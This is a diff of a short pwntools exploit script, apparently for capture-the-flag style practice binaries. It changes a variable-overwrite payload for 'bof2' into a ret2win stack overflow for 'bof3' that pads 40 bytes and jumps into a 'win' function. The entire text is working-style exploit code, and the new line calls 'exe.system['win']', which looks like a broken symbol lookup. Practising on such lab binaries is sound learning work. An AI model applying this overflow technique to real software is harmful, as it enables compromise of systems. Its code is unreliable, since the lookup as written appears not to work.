@@ -1,9 +1,8 @@
 from pwn import *
 
-exe = ELF("./bof2", checksec=False)
+exe = ELF("./bof3", checksec=False)
+p = process("./bof3")
 
-p = process("./bof2")
-
-payload = b"a" * 16 + p64(0xCAFEBABE) + p64(0xDEADBEEF) + p64(0x13371337)
-p.sendline(payload)
+payload = b"a" * 40 + p64(exe.system['win'] + 5)
+p.send(payload)
 p.interactive()
